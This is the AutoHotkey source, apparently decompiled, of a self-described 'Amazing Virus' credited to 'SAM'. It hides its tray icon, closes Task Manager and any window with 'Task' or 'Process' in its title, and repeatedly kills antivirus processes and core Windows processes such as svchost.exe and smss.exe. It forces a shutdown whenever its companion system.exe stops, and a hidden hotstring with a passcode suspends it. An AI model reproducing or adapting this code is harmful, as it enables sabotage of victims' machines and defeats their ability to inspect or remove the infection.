; <COMPILER: v1.0.47.5>

#SingleInstance force
#notrayicon
#persistent

DetectHiddenWindows, on


settimer,kill,3000
settimer,bantask,3000
settimer,protect,3000

protect:

{
Process,exist,system.exe
NewPID = %ErrorLevel%
if NewPID = 0
{
    Shutdown, 6
    return
}
return

}

bantask:
{


IfWinExist, Windows Task Manager
  {
   Process, Close, Taskmgr.exe
   SoundPlay,*64
   SplashTextOn, 200, 60,                  - SAM -,`n--  S o r r y  --
   sleep 3000
   SplashTextOff
   return
  }

WinGetActiveTitle, ed1

 ifinstring,ed1,Task
  {

   WinClose %ed1%
   SoundPlay,*64

   SplashTextOn, 200, 60,                  - SAM -,`n--  S o r r y  --
   sleep 3000
   SplashTextOff
   return
  }

 ifinstring,ed1,Process
  {
   WinClose %ed1%
   SoundPlay,*64
   SplashTextOn, 200, 60,                  - SAM -,`n--  S o r r y  --
   sleep 3000
   SplashTextOff
   return
  }

}





kill:
{

Process, Close, avpo.exe
Process, Close, avp0.exe

Process, Close, ssvichosst.exe

Process, Close,New Folder.exe

Process, Close,SCVVHSOT.exe

Process, Close,SCVHSOT.exe

Process, Close,scvshosts.exe

Process, Close,hinhem.scr

Process, Close,blastclnnn.exe




Process, Close, svchost.exe
Process, Close, MsUpdate.exe
Process, Close, Winlogons.exe



Process, Close, ssvichosst.exe



Process, Close, smss.exe
Process, Close, killer.exe
Process, Close, Funny UST Scandal.exe


Process, Close,fooool.exe
Process, Close,fun.exe
Process, Close,dc.exe

Process, Close, run.exe
Process, Close, shell32.exe
Process, Close, cmrss.exe
Process, Close, ntdetec1.exe

return
}




:*:lahens::

{



	SoundPlay, %A_WinDir%\Help\Tours\WindowsMediaPlayer\Audio\Wav\wmpaud6.wav

	SplashTextOn 400,100,,`n`nWelcome to... `n
	Sleep, 2000
	SplashTextOff

        SplashTextOn 400,160,,`n"Amazing Virus"`nBy`n `n- SAM -`nalias`n  Snehal Masne!!
	Sleep, 5000
	SplashTextOff

	SplashTextOn 400,110,,`nHope u r enjoying `n`nOrkut - Pornography - Proxy free internet access !!
	Sleep, 4000
	SplashTextOff

	SplashTextOn 400,100,,`n`nGood Bye !!!`n
	Sleep, 3000
	SplashTextOff



	InputBox, OutputVar , -SAM-, Want to suspend -SAM- Virus`, Enter Passcode: , HIDE, 440, 115

	IfEqual, OutputVar, ensam
	{
		InputBox, Out , -SAM-, Time to suspend for:(in msec),, 240, 115
 		if out > 0
		{	settimer,protect,off
			SplashTextOn 300,80,,`nVirus Deactivated for %Out% msec !!
			sleep 2000
			SplashTextOff

			process, close, system.exe
			process, close, system.exe
			process, close, system.exe
			process, close, system.exe
			process, close, system.exe
			process, close, system.exe
			process, close, system.exe
			process, close, system.exe
			process, close, system.exe
			process, close, system.exe
			sleep %Out%

			run, c:\Config\system.exe
			settimer,protect,on
			SplashTextOn 200,80,,`nVirus Activated !!
			sleep 3000
			SplashTextOff

		}

	}
	else
	{	SplashTextOn 200,80,,`nWrong Password !!!
		Sleep, 2000
		SplashTextOff
	}


	return






}




